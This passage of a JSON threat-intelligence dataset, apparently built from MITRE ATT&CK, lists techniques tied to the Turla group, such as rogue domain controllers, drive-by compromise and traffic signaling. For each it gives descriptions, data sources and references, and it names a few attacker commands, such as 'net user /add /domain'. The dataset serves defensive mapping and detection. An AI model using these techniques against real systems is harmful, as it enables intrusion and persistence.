        "description": "Microsoft TechNet. (n.d.). Retrieved April 25, 2017.",
        "external_id": "none"
      },
      {
        "source_name": "Pentestlab Token Manipulation",
        "url": "https://pentestlab.blog/2017/04/03/token-manipulation/",
        "description": "netbiosX. (2017, April 3). Token Manipulation. Retrieved April 21, 2017.",
        "external_id": "none"
      },
      {
        "source_name": "capec",
        "url": "https://capec.mitre.org/data/definitions/633.html",
        "description": "none",
        "external_id": "CAPEC-633"
      }
    ],
    "technique_required_permissions": "user|administrator",
    "technique_effective_permissions": "system",
    "search_token": "none"
  },
  {
    "id": "attack-pattern--7610cada-1499-41a4-b3dd-46467b68d177",
    "platform": "windows|macos|linux",
    "tid": "T1136.002",
    "technique": "Domain Account",
    "tactic": "persistence",
    "datasources": "command-execution|process-creation|user-account-creation",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "turla",
    "correlation_malware": "",
    "correlation_tool": "empire|net|psexec",
    "correlation_gid": "G0010",
    "technique_description": "Adversaries may create a domain account to maintain access to victim systems. Domain accounts are those managed by Active Directory Domain Services where access and permissions are configured across systems and services that are part of that domain. Domain accounts can cover user, administrator, and service accounts. With a sufficient level of access, the <code>net user /add /domain</code> command can be used to create a domain account.\n\nSuch accounts may be used to establish secondary credentialed access that do not require persistent remote access tools to be deployed on the system.",
    "technique_references": [
      {
        "source_name": "Microsoft User Creation Event",
        "url": "https://docs.microsoft.com/en-us/windows/security/threat-protection/auditing/event-4720",
        "description": "Lich, B., Miroshnikov, A. (2017, April 5). 4720(S): A user account was created. Retrieved June 30, 2017.",
        "external_id": "none"
      }
    ],
    "technique_required_permissions": "administrator",
    "technique_effective_permissions": "none",
    "search_token": "none"
  },
  {
    "id": "attack-pattern--3ccef7ae-cb5e-48f6-8302-897105fbf55c",
    "platform": "windows|linux|macos",
    "tid": "T1140",
    "technique": "Deobfuscate/Decode Files or Information",
    "tactic": "defense-evasion",
    "datasources": "file-modification|process-creation|script-execution",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "turla",
    "correlation_malware": "carbon|comrat|lightneuron",
    "correlation_tool": "certutil|ironnetinjector",
    "correlation_gid": "G0010",
    "technique_description": "Adversaries may use [Obfuscated Files or Information](https://attack.mitre.org/techniques/T1027) to hide artifacts of an intrusion from analysis. They may require separate mechanisms to decode or deobfuscate that information depending on how they intend to use it. Methods for doing that include built-in functionality of malware or by using utilities present on the system.\n\nOne such example is use of [certutil](https://attack.mitre.org/software/S0160) to decode a remote access tool portable executable file that has been hidden inside a certificate file. (Citation: Malwarebytes Targeted Attack against Saudi Arabia) Another example is using the Windows <code>copy /b</code> command to reassemble binary fragments into a malicious payload. (Citation: Carbon Black Obfuscation Sept 2016)\n\nSometimes a user's action may be required to open it for deobfuscation or decryption as part of [User Execution](https://attack.mitre.org/techniques/T1204). The user may also be required to input a password to open a password protected compressed/encrypted file that was provided by the adversary. (Citation: Volexity PowerDuke November 2016)",
    "technique_references": [
      {
        "source_name": "Volexity PowerDuke November 2016",
        "url": "https://www.volexity.com/blog/2016/11/09/powerduke-post-election-spear-phishing-campaigns-targeting-think-tanks-and-ngos/",
        "description": "Adair, S.. (2016, November 9). PowerDuke: Widespread Post-Election Spear Phishing Campaigns Targeting Think Tanks and NGOs. Retrieved January 11, 2017.",
        "external_id": "none"
      },
      {
        "source_name": "Malwarebytes Targeted Attack against Saudi Arabia",
        "url": "https://blog.malwarebytes.com/cybercrime/social-engineering-cybercrime/2017/03/new-targeted-attack-saudi-arabia-government/",
        "description": "Malwarebytes Labs. (2017, March 27). New targeted attack against Saudi Arabia Government. Retrieved July 3, 2017.",
        "external_id": "none"
      },
      {
        "source_name": "Carbon Black Obfuscation Sept 2016",
        "url": "https://www.carbonblack.com/2016/09/23/security-advisory-variants-well-known-adware-families-discovered-include-sophisticated-obfuscation-techniques-previously-associated-nation-state-attacks/",
        "description": "Tedesco, B. (2016, September 23). Security Alert Summary. Retrieved February 12, 2018.",
        "external_id": "none"
      }
    ],
    "technique_required_permissions": "none",
    "technique_effective_permissions": "none",
    "search_token": "none"
  },
  {
    "id": "attack-pattern--d742a578-d70e-4d0e-96a6-02a9c30204e6",
    "platform": "windows|linux|macos|saas",
    "tid": "T1189",
    "technique": "Drive-by Compromise",
    "tactic": "initial-access",
    "datasources": "application-log-content|file-creation|network-connection-creation|network-traffic-content|process-creation",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "turla",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "G0010",
    "technique_description": "Adversaries may gain access to a system through a user visiting a website over the normal course of browsing. With this technique, the user's web browser is typically targeted for exploitation, but adversaries may also use compromised websites for non-exploitation behavior such as acquiring [Application Access Token](https://attack.mitre.org/techniques/T1550/001).\n\nMultiple ways of delivering exploit code to a browser exist, including:\n\n* A legitimate website is compromised where adversaries have injected some form of malicious code such as JavaScript, iFrames, and cross-site scripting.\n* Malicious ads are paid for and served through legitimate ad providers.\n* Built-in web application interfaces are leveraged for the insertion of any other kind of object that can be used to display web content or contain a script that executes on the visiting client (e.g. forum posts, comments, and other user controllable web content).\n\nOften the website used by an adversary is one visited by a specific community, such as government, a particular industry, or region, where the goal is to compromise a specific user or set of users based on a shared interest. This kind of targeted campaign is often referred to a strategic web compromise or watering hole attack. There are several known examples of this occurring.(Citation: Shadowserver Strategic Web Compromise)\n\nTypical drive-by compromise process:\n\n1. A user visits a website that is used to host the adversary controlled content.\n2. Scripts automatically execute, typically searching versions of the browser and plugins for a potentially vulnerable version. \n    * The user may be required to assist in this process by enabling scripting or active website components and ignoring warning dialog boxes.\n3. Upon finding a vulnerable version, exploit code is delivered to the browser.\n4. If exploitation is successful, then it will give the adversary code execution on the user's system unless other protections are in place.\n    * In some cases a second visit to the website after the initial scan is required before exploit code is delivered.\n\nUnlike [Exploit Public-Facing Application](https://attack.mitre.org/techniques/T1190), the focus of this technique is to exploit software on a client endpoint upon visiting a website. This will commonly give an adversary access to systems on the internal network instead of external systems that may be in a DMZ.\n\nAdversaries may also use compromised websites to deliver a user to a malicious application designed to [Steal Application Access Token](https://attack.mitre.org/techniques/T1528)s, like OAuth tokens, to gain access to protected applications and information. These malicious applications have been delivered through popups on legitimate websites.(Citation: Volexity OceanLotus Nov 2017)",
    "technique_references": [
      {
        "source_name": "Shadowserver Strategic Web Compromise",
        "url": "http://blog.shadowserver.org/2012/05/15/cyber-espionage-strategic-web-compromises-trusted-websites-serving-dangerous-results/",
        "description": "Adair, S., Moran, N. (2012, May 15). Cyber Espionage & Strategic Web Compromises – Trusted Websites Serving Dangerous Results. Retrieved March 13, 2018.",
        "external_id": "none"
      },
      {
        "source_name": "Volexity OceanLotus Nov 2017",
        "url": "https://www.volexity.com/blog/2017/11/06/oceanlotus-blossoms-mass-digital-surveillance-and-exploitation-of-asean-nations-the-media-human-rights-and-civil-society/",
        "description": "Lassalle, D., et al. (2017, November 6). OceanLotus Blossoms: Mass Digital Surveillance and Attacks Targeting ASEAN, Asian Nations, the Media, Human Rights Groups, and Civil Society. Retrieved November 6, 2017.",
        "external_id": "none"
      }
    ],
    "technique_required_permissions": "user",
    "technique_effective_permissions": "none",
    "search_token": "none"
  },
  {
    "id": "attack-pattern--ef67e13e-5598-4adc-bdb2-998225874fa9",
    "platform": "linux|macos|windows",
    "tid": "T1204.001",
    "technique": "Malicious Link",
    "tactic": "execution",
    "datasources": "file-creation|network-connection-creation|network-traffic-content",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "turla",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "G0010",
    "technique_description": "An adversary may rely upon a user clicking a malicious link in order to gain execution. Users may be subjected to social engineering to get them to click on a link that will lead to code execution. This user action will typically be observed as follow-on behavior from [Spearphishing Link](https://attack.mitre.org/techniques/T1566/002). Clicking on a link may also lead to other execution techniques such as exploitation of a browser or application vulnerability via [Exploitation for Client Execution](https://attack.mitre.org/techniques/T1203). Links may also lead users to download files that require execution via [Malicious File](https://attack.mitre.org/techniques/T1204/002).",
    "technique_references": [],
    "technique_required_permissions": "user",
    "technique_effective_permissions": "none",
    "search_token": "none"
  },
  {
    "id": "attack-pattern--451a9977-d255-43c9-b431-66de80130c8c",
    "platform": "linux|macos|windows|network",
    "tid": "T1205",
    "technique": "Traffic Signaling",
    "tactic": "command-and-control",
    "datasources": "network-connection-creation|network-traffic-content|network-traffic-flow",
    "has_subtechniques": true,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [
      "T1205.001"
    ],
    "count_subtechniques": 1,
    "correlation_adversary": "turla",
    "correlation_malware": "penquin",
    "correlation_tool": "none",
    "correlation_gid": "G0010",
    "technique_description": "Adversaries may use traffic signaling to hide open ports or other malicious functionality used for persistence or command and control. Traffic signaling involves the use of a magic value or sequence that must be sent to a system to trigger a special response, such as opening a closed port or executing a malicious task. This may take the form of sending a series of packets with certain characteristics before a port will be opened that the adversary can use for command and control. Usually this series of packets consists of attempted connections to a predefined sequence of closed ports (i.e. [Port Knocking](https://attack.mitre.org/techniques/T1205/001)), but can involve unusual flags, specific strings, or other unique characteristics. After the sequence is completed, opening a port may be accomplished by the host-based firewall, but could also be implemented by custom software.\n\nAdversaries may also communicate with an already open port, but the service listening on that port will only respond to commands or trigger other malicious functionality if passed the appropriate magic value(s).\n\nThe observation of the signal packets to trigger the communication can be conducted through different methods. One means, originally implemented by Cd00r (Citation: Hartrell cd00r 2002), is to use the libpcap libraries to sniff for the packets in question. Another method leverages raw sockets, which enables the malware to use ports that are already open for use by other programs.\n\nOn network devices, adversaries may use crafted packets to enable [Network Device Authentication](https://attack.mitre.org/techniques/T1556/004) for standard services offered by the device such as telnet.  Such signaling may also be used to open a closed service port such as telnet, or to trigger module modification of malware implants on the device, adding, removing, or changing malicious capabilities.  Adversaries may use crafted packets to attempt to connect to one or more (open or closed) ports, but may also attempt to connect to a router interface, broadcast, and network address IP on the same port in order to achieve their goals and objectives.(Citation: Cisco Synful Knock Evolution)(Citation: Mandiant - Synful Knock)(Citation: Cisco Blog Legacy Device Attacks)  To enable this traffic signaling on embedded devices, adversaries must first achieve and leverage [Patch System Image](https://attack.mitre.org/techniques/T1601/001) due to the monolithic nature of the architecture.\n\nAdversaries may also use the Wake-on-LAN feature to turn on powered off systems. Wake-on-LAN is a hardware feature that allows a powered down system to be powered on, or woken up, by sending a magic packet to it. Once the system is powered on, it may become a target for lateral movement.(Citation: Bleeping Computer - Ryuk WoL)(Citation: AMD Magic Packet)",
    "technique_references": [
      {
        "source_name": "Bleeping Computer - Ryuk WoL",
        "url": "https://www.bleepingcomputer.com/news/security/ryuk-ransomware-uses-wake-on-lan-to-encrypt-offline-devices/",
        "description": "Abrams, L. (2021, January 14). Ryuk Ransomware Uses Wake-on-Lan To Encrypt Offline Devices. Retrieved February 11, 2021.",
        "external_id": "none"
      },
      {
        "source_name": "AMD Magic Packet",
        "url": "https://www.amd.com/system/files/TechDocs/20213.pdf",
        "description": "AMD. (1995, November 1). Magic Packet Technical White Paper. Retrieved February 17, 2021.",
        "external_id": "none"
      },
      {
        "source_name": "Mandiant - Synful Knock",
        "url": "https://www.mandiant.com/resources/synful-knock-acis",
        "description": "Bill Hau, Tony Lee, Josh Homan. (2015, September 15). SYNful Knock - A Cisco router implant - Part I. Retrieved October 19, 2020.",
        "external_id": "none"
      },
      {
        "source_name": "Cisco Synful Knock Evolution",
        "url": "https://blogs.cisco.com/security/evolution-of-attacks-on-cisco-ios-devices",
        "description": "Graham Holmes. (2015, October 8). Evolution of attacks on Cisco IOS devices. Retrieved October 19, 2020.",
        "external_id": "none"
      },
      {
        "source_name": "Hartrell cd00r 2002",
        "url": "https://www.giac.org/paper/gcih/342/handle-cd00r-invisible-backdoor/103631",
        "description": "Hartrell, Greg. (2002, August). Get a handle on cd00r: The invisible backdoor. Retrieved October 13, 2018.",
        "external_id": "none"
      },
      {
        "source_name": "Cisco Blog Legacy Device Attacks",
        "url": "https://community.cisco.com/t5/security-blogs/attackers-continue-to-target-legacy-devices/ba-p/4169954",
        "description": "Omar Santos. (2020, October 19). Attackers Continue to Target Legacy Devices. Retrieved October 20, 2020.",
        "external_id": "none"
      },
      {
        "source_name": "GitLab WakeOnLAN",
        "url": "https://gitlab.com/wireshark/wireshark/-/wikis/WakeOnLAN",
        "description": "Perry, David. (2020, August 11). WakeOnLAN (WOL). Retrieved February 17, 2021.",
        "external_id": "none"
      }
    ],
    "technique_required_permissions": "none",
    "technique_effective_permissions": "none",
    "search_token": "none"
  },
  {
    "id": "attack-pattern--451a9977-d255-43c9-b431-66de80130c8c",
    "platform": "linux|macos|windows|network",
    "tid": "T1205",
    "technique": "Traffic Signaling",
    "tactic": "defense-evasion",
    "datasources": "network-connection-creation|network-traffic-content|network-traffic-flow",
    "has_subtechniques": true,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [
      "T1205.001"
    ],
    "count_subtechniques": 1,
    "correlation_adversary": "turla",
    "correlation_malware": "penquin",
    "correlation_tool": "none",
    "correlation_gid": "G0010",
    "technique_description": "Adversaries may use traffic signaling to hide open ports or other malicious functionality used for persistence or command and control. Traffic signaling involves the use of a magic value or sequence that must be sent to a system to trigger a special response, such as opening a closed port or executing a malicious task. This may take the form of sending a series of packets with certain characteristics before a port will be opened that the adversary can use for command and control. Usually this series of packets consists of attempted connections to a predefined sequence of closed ports (i.e. [Port Knocking](https://attack.mitre.org/techniques/T1205/001)), but can involve unusual flags, specific strings, or other unique characteristics. After the sequence is completed, opening a port may be accomplished by the host-based firewall, but could also be implemented by custom software.\n\nAdversaries may also communicate with an already open port, but the service listening on that port will only respond to commands or trigger other malicious functionality if passed the appropriate magic value(s).\n\nThe observation of the signal packets to trigger the communication can be conducted through different methods. One means, originally implemented by Cd00r (Citation: Hartrell cd00r 2002), is to use the libpcap libraries to sniff for the packets in question. Another method leverages raw sockets, which enables the malware to use ports that are already open for use by other programs.\n\nOn network devices, adversaries may use crafted packets to enable [Network Device Authentication](https://attack.mitre.org/techniques/T1556/004) for standard services offered by the device such as telnet.  Such signaling may also be used to open a closed service port such as telnet, or to trigger module modification of malware implants on the device, adding, removing, or changing malicious capabilities.  Adversaries may use crafted packets to attempt to connect to one or more (open or closed) ports, but may also attempt to connect to a router interface, broadcast, and network address IP on the same port in order to achieve their goals and objectives.(Citation: Cisco Synful Knock Evolution)(Citation: Mandiant - Synful Knock)(Citation: Cisco Blog Legacy Device Attacks)  To enable this traffic signaling on embedded devices, adversaries must first achieve and leverage [Patch System Image](https://attack.mitre.org/techniques/T1601/001) due to the monolithic nature of the architecture.\n\nAdversaries may also use the Wake-on-LAN feature to turn on powered off systems. Wake-on-LAN is a hardware feature that allows a powered down system to be powered on, or woken up, by sending a magic packet to it. Once the system is powered on, it may become a target for lateral movement.(Citation: Bleeping Computer - Ryuk WoL)(Citation: AMD Magic Packet)",
    "technique_references": [
      {
        "source_name": "Bleeping Computer - Ryuk WoL",
        "url": "https://www.bleepingcomputer.com/news/security/ryuk-ransomware-uses-wake-on-lan-to-encrypt-offline-devices/",
        "description": "Abrams, L. (2021, January 14). Ryuk Ransomware Uses Wake-on-Lan To Encrypt Offline Devices. Retrieved February 11, 2021.",
        "external_id": "none"
      },
      {
        "source_name": "AMD Magic Packet",
        "url": "https://www.amd.com/system/files/TechDocs/20213.pdf",
        "description": "AMD. (1995, November 1). Magic Packet Technical White Paper. Retrieved February 17, 2021.",
        "external_id": "none"
      },
      {
        "source_name": "Mandiant - Synful Knock",
        "url": "https://www.mandiant.com/resources/synful-knock-acis",
        "description": "Bill Hau, Tony Lee, Josh Homan. (2015, September 15). SYNful Knock - A Cisco router implant - Part I. Retrieved October 19, 2020.",
        "external_id": "none"
      },
      {
        "source_name": "Cisco Synful Knock Evolution",
        "url": "https://blogs.cisco.com/security/evolution-of-attacks-on-cisco-ios-devices",
        "description": "Graham Holmes. (2015, October 8). Evolution of attacks on Cisco IOS devices. Retrieved October 19, 2020.",
        "external_id": "none"
      },
      {
        "source_name": "Hartrell cd00r 2002",
        "url": "https://www.giac.org/paper/gcih/342/handle-cd00r-invisible-backdoor/103631",
        "description": "Hartrell, Greg. (2002, August). Get a handle on cd00r: The invisible backdoor. Retrieved October 13, 2018.",
        "external_id": "none"
      },
      {
        "source_name": "Cisco Blog Legacy Device Attacks",
        "url": "https://community.cisco.com/t5/security-blogs/attackers-continue-to-target-legacy-devices/ba-p/4169954",
        "description": "Omar Santos. (2020, October 19). Attackers Continue to Target Legacy Devices. Retrieved October 20, 2020.",
        "external_id": "none"
      },
      {
        "source_name": "GitLab WakeOnLAN",
        "url": "https://gitlab.com/wireshark/wireshark/-/wikis/WakeOnLAN",
        "description": "Perry, David. (2020, August 11). WakeOnLAN (WOL). Retrieved February 17, 2021.",
        "external_id": "none"
      }
    ],
    "technique_required_permissions": "none",
    "technique_effective_permissions": "none",
    "search_token": "none"
  },
  {
    "id": "attack-pattern--451a9977-d255-43c9-b431-66de80130c8c",
    "platform": "linux|macos|windows|network",
    "tid": "T1205",
    "technique": "Traffic Signaling",
    "tactic": "persistence",
    "datasources": "network-connection-creation|network-traffic-content|network-traffic-flow",
    "has_subtechniques": true,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [
      "T1205.001"
    ],
    "count_subtechniques": 1,
    "correlation_adversary": "turla",
    "correlation_malware": "penquin",
    "correlation_tool": "none",
    "correlation_gid": "G0010",
    "technique_description": "Adversaries may use traffic signaling to hide open ports or other malicious functionality used for persistence or command and control. Traffic signaling involves the use of a magic value or sequence that must be sent to a system to trigger a special response, such as opening a closed port or executing a malicious task. This may take the form of sending a series of packets with certain characteristics before a port will be opened that the adversary can use for command and control. Usually this series of packets consists of attempted connections to a predefined sequence of closed ports (i.e. [Port Knocking](https://attack.mitre.org/techniques/T1205/001)), but can involve unusual flags, specific strings, or other unique characteristics. After the sequence is completed, opening a port may be accomplished by the host-based firewall, but could also be implemented by custom software.\n\nAdversaries may also communicate with an already open port, but the service listening on that port will only respond to commands or trigger other malicious functionality if passed the appropriate magic value(s).\n\nThe observation of the signal packets to trigger the communication can be conducted through different methods. One means, originally implemented by Cd00r (Citation: Hartrell cd00r 2002), is to use the libpcap libraries to sniff for the packets in question. Another method leverages raw sockets, which enables the malware to use ports that are already open for use by other programs.\n\nOn network devices, adversaries may use crafted packets to enable [Network Device Authentication](https://attack.mitre.org/techniques/T1556/004) for standard services offered by the device such as telnet.  Such signaling may also be used to open a closed service port such as telnet, or to trigger module modification of malware implants on the device, adding, removing, or changing malicious capabilities.  Adversaries may use crafted packets to attempt to connect to one or more (open or closed) ports, but may also attempt to connect to a router interface, broadcast, and network address IP on the same port in order to achieve their goals and objectives.(Citation: Cisco Synful Knock Evolution)(Citation: Mandiant - Synful Knock)(Citation: Cisco Blog Legacy Device Attacks)  To enable this traffic signaling on embedded devices, adversaries must first achieve and leverage [Patch System Image](https://attack.mitre.org/techniques/T1601/001) due to the monolithic nature of the architecture.\n\nAdversaries may also use the Wake-on-LAN feature to turn on powered off systems. Wake-on-LAN is a hardware feature that allows a powered down system to be powered on, or woken up, by sending a magic packet to it. Once the system is powered on, it may become a target for lateral movement.(Citation: Bleeping Computer - Ryuk WoL)(Citation: AMD Magic Packet)",
    "technique_references": [
      {
        "source_name": "Bleeping Computer - Ryuk WoL",
        "url": "https://www.bleepingcomputer.com/news/security/ryuk-ransomware-uses-wake-on-lan-to-encrypt-offline-devices/",
        "description": "Abrams, L. (2021, January 14). Ryuk Ransomware Uses Wake-on-Lan To Encrypt Offline Devices. Retrieved February 11, 2021.",
        "external_id": "none"
      },
      {
        "source_name": "AMD Magic Packet",
        "url": "https://www.amd.com/system/files/TechDocs/20213.pdf",
        "description": "AMD. (1995, November 1). Magic Packet Technical White Paper. Retrieved February 17, 2021.",
        "external_id": "none"
      },
      {
        "source_name": "Mandiant - Synful Knock",
        "url": "https://www.mandiant.com/resources/synful-knock-acis",
        "description": "Bill Hau, Tony Lee, Josh Homan. (2015, September 15). SYNful Knock - A Cisco router implant - Part I. Retrieved October 19, 2020.",
        "external_id": "none"
      },
      {
        "source_name": "Cisco Synful Knock Evolution",
        "url": "https://blogs.cisco.com/security/evolution-of-attacks-on-cisco-ios-devices",
        "description": "Graham Holmes. (2015, October 8). Evolution of attacks on Cisco IOS devices. Retrieved October 19, 2020.",
        "external_id": "none"
      },
      {
        "source_name": "Hartrell cd00r 2002",
        "url": "https://www.giac.org/paper/gcih/342/handle-cd00r-invisible-backdoor/103631",
        "description": "Hartrell, Greg. (2002, August). Get a handle on cd00r: The invisible backdoor. Retrieved October 13, 2018.",
        "external_id": "none"
      },
      {
        "source_name": "Cisco Blog Legacy Device Attacks",
        "url": "https://community.cisco.com/t5/security-blogs/attackers-continue-to-target-legacy-devices/ba-p/4169954",
        "description": "Omar Santos. (2020, October 19). Attackers Continue to Target Legacy Devices. Retrieved October 20, 2020.",
        "external_id": "none"
      },
      {
        "source_name": "GitLab WakeOnLAN",
        "url": "https://gitlab.com/wireshark/wireshark/-/wikis/WakeOnLAN",
        "description": "Perry, David. (2020, August 11). WakeOnLAN (WOL). Retrieved February 17, 2021.",
        "external_id": "none"
      }
    ],
    "technique_required_permissions": "none",
    "technique_effective_permissions": "none",
    "search_token": "none"
  },
  {
    "id": "attack-pattern--564998d8-ab3e-4123-93fb-eccaa6b9714a",
    "platform": "windows",
    "tid": "T1207",
    "technique": "Rogue Domain Controller",
    "tactic": "defense-evasion",
    "datasources": "active-directory-object-creation|active-directory-object-modification|network-traffic-content|user-account-authentication",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "turla",
    "correlation_malware": "none",
    "correlation_tool": "mimikatz",
    "correlation_gid": "G0010",
    "technique_description": "Adversaries may register a rogue Domain Controller to enable manipulation of Active Directory data. DCShadow may be used to create a rogue Domain Controller (DC). DCShadow is a method of manipulating Active Directory (AD) data, including objects and schemas, by registering (or reusing an inactive registration) and simulating the behavior of a DC. (Citation: DCShadow Blog) Once registered, a rogue DC may be able to inject and replicate changes into AD infrastructure for any domain object, including credentials and keys.\n\nRegistering a rogue DC involves creating a new server and nTDSDSA objects in the Configuration partition of the AD schema, which requires Administrator privileges (either Domain or local to the DC) or the KRBTGT hash. (Citation: Adsecurity Mimikatz Guide)\n\nThis technique may bypass system logging and security monitors such as security information and event management (SIEM) products (since actions taken on a rogue DC may not be reported to these sensors). (Citation: DCShadow Blog) The technique may also be used to alter and delete replication and other associated metadata to obstruct forensic analysis. Adversaries may also utilize this technique to perform [SID-History Injection](https://attack.mitre.org/techniques/T1134/005) and/or manipulate AD objects (such as accounts, access control lists, schemas) to establish backdoors for Persistence. (Citation: DCShadow Blog)",
    "technique_references": [
      {
        "source_name": "DCShadow Blog",
        "url": "https://www.dcshadow.com/",
        "description": "Delpy, B. & LE TOUX, V. (n.d.). DCShadow. Retrieved March 20, 2018.",
        "external_id": "none"
      },
      {
        "source_name": "Adsecurity Mimikatz Guide",
        "url": "https://adsecurity.org/?page_id=1821",
        "description": "Metcalf, S. (2015, November 13). Unofficial Guide to Mimikatz & Command Reference. Retrieved December 23, 2015.",
        "external_id": "none"
      },
      {
        "source_name": "GitHub DCSYNCMonitor",
        "url": "https://github.com/shellster/DCSYNCMonitor",
        "description": "Spencer S. (2018, February 22). DCSYNCMonitor. Retrieved March 30, 2018.",
        "external_id": "none"
      },
      {
        "source_name": "Microsoft DirSync",
        "url": "https://msdn.microsoft.com/en-us/library/ms677626.aspx",
        "description": "Microsoft. (n.d.). Polling for Changes Using the DirSync Control. Retrieved March 30, 2018.",
        "external_id": "none"
      },
      {
        "source_name": "ADDSecurity DCShadow Feb 2018",
        "url": "https://adds-security.blogspot.fr/2018/02/detecter-dcshadow-impossible.html",
        "description": "Lucand,G. (2018, February 18). Detect DCShadow, impossible?. Retrieved March 30, 2018.",
        "external_id": "none"
      }
    ],
    "technique_required_permissions": "administrator",
    "technique_effective_permissions": "none",
    "search_token": "none"
  },
  {
    "id": "attack-pattern--9db0cf3a-a3c9-4012-8268-123b9db6fd82",
    "platform": "linux|windows|macos",
    "tid": "T1210",
    "technique": "Exploitation of Remote Services",
    "tactic": "lateral-movement",
    "datasources": "application-log-content|network-traffic-content",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "turla",
    "correlation_malware": "none",
    "correlation_tool": "empire",
    "correlation_gid": "G0010",
    "technique_description": "Adversaries may exploit remote services to gain unauthorized access to internal systems once inside of a network. Exploitation of a software vulnerability occurs when an adversary takes advantage of a programming error in a program, service, or within the operating system software or kernel itself to execute adversary-controlled code. A common goal for post-compromise exploitation of remote services is for lateral movement to enable access to a remote system.\n\nAn adversary may need to determine if the remote system is in a vulnerable state, which may be done through [Network Service Discovery](https://attack.mitre.org/techniques/T1046) or other Discovery methods looking for common, vulnerable software that may be deployed in the network, the lack of certain patches that may indicate vulnerabilities,  or security software that may be used to detect or contain remote exploitation. Servers are likely a high value target for lateral movement exploitation, but endpoint systems may also be at risk if they provide an advantage or access to additional resources.\n\nThere are several well-known vulnerabilities that exist in common services such as SMB (Citation: CIS Multiple SMB Vulnerabilities) and RDP (Citation: NVD CVE-2017-0176) as well as applications that may be used within internal networks such as MySQL (Citation: NVD CVE-2016-6662) and web server services.(Citation: NVD CVE-2014-7169)\n\nDepending on the permissions level of the vulnerable remote service an adversary may achieve [Exploitation for Privilege Escalation](https://attack.mitre.org/techniques/T1068) as a result of lateral movement exploitation as well.",
    "technique_references": [
      {
        "source_name": "CIS Multiple SMB Vulnerabilities",
        "url": "https://www.cisecurity.org/advisory/multiple-vulnerabilities-in-microsoft-windows-smb-server-could-allow-for-remote-code-execution/",
        "description": "CIS. (2017, May 15). Multiple Vulnerabilities in Microsoft Windows SMB Server Could Allow for Remote Code Execution. Retrieved April 3, 2018.",
        "external_id": "none"
      },
      {
        "source_name": "NVD CVE-2017-0176",
        "url": "https://nvd.nist.gov/vuln/detail/CVE-2017-0176",
        "description": "National Vulnerability Database. (2017, June 22). CVE-2017-0176 Detail. Retrieved April 3, 2018.",
        "external_id": "none"
      },
      {
        "source_name": "NVD CVE-2016-6662",
        "url": "https://nvd.nist.gov/vuln/detail/CVE-2016-6662",
        "description": "National Vulnerability Database. (2017, February 2). CVE-2016-6662 Detail. Retrieved April 3, 2018.",
        "external_id": "none"
      },
      {
        "source_name": "NVD CVE-2014-7169",
        "url": "https://nvd.nist.gov/vuln/detail/CVE-2014-7169",
        "description": "National Vulnerability Database. (2017, September 24). CVE-2014-7169 Detail. Retrieved April 3, 2018.",
        "external_id": "none"
      }
    ],
    "technique_required_permissions": "user",
    "technique_effective_permissions": "none",
    "search_token": "none"
  },
  {
    "id": "attack-pattern--d28ef391-8ed4-45dc-bc4a-2f43abf54416",
    "platform": "linux|windows|macos|saas|office-365|google-workspace|iaas",
    "tid": "T1213",
    "technique": "Data from Information Repositories",
    "tactic": "collection",
    "datasources": "application-log-content|logon-session-creation",
    "has_subtechniques": true,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [
      "T1213.001",
      "T1213.002",
      "T1213.003"
    ],
    "count_subtechniques": 3,
    "correlation_adversary": "turla",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "G0010",
    "technique_description": "Adversaries may leverage information repositories to mine valuable information. Information repositories are tools that allow for storage of information, typically to facilitate collaboration or information sharing between users, and can store a wide variety of data that may aid adversaries in further objectives, or direct access to the target information. Adversaries may also abuse external sharing features to share sensitive documents with recipients outside of the organization. \n\nThe following is a brief list of example information that may hold potential value to an adversary and may also be found on an information repository:\n\n* Policies, procedures, and standards\n* Physical / logical network diagrams\n* System architecture diagrams\n* Technical system documentation\n* Testing / development credentials\n* Work / project schedules\n* Source code snippets\n* Links to network shares and other internal resources\n\nInformation stored in a repository may vary based on the specific instance or environment. Specific common information repositories include web-based platforms such as [Sharepoint](https://attack.mitre.org/techniques/T1213/002) and [Confluence](https://attack.mitre.org/techniques/T1213/001), specific services such as Code Repositories, IaaS databases, enterprise databases, and other storage infrastructure such as SQL Server.",
    "technique_references": [
      {
        "source_name": "Atlassian Confluence Logging",
        "url": "https://confluence.atlassian.com/confkb/how-to-enable-user-access-logging-182943.html",
        "description": "Atlassian. (2018, January 9). How to Enable User Access Logging. Retrieved April 4, 2018.",
        "external_id": "none"
      },
      {
        "source_name": "Microsoft SharePoint Logging",
        "url": "https://support.office.com/en-us/article/configure-audit-settings-for-a-site-collection-a9920c97-38c0-44f2-8bcb-4cf1e2ae22d2",
        "description": "Microsoft. (2017, July 19). Configure audit settings for a site collection. Retrieved April 4, 2018.",
        "external_id": "none"
      },
      {
        "source_name": "Sharepoint Sharing Events",
        "url": "https://docs.microsoft.com/en-us/microsoft-365/compliance/use-sharing-auditing?view=o365-worldwide#sharepoint-sharing-events",
        "description": "Microsoft. (n.d.). Sharepoint Sharing Events. Retrieved October 8, 2021.",
        "external_id": "none"
      }
    ],
    "technique_required_permissions": "none",
    "technique_effective_permissions": "none",
    "search_token": "none"
  },
  {
    "id": "attack-pattern--5e4a2073-9643-44cb-a0b5-e7f4048446c7",
    "platform": "linux|windows|macos",
    "tid": "T1217",
    "technique": "Browser Bookmark Discovery",
    "tactic": "discovery",
    "datasources": "command-execution|file-access|process-creation",
    "has_subtechniques": false,
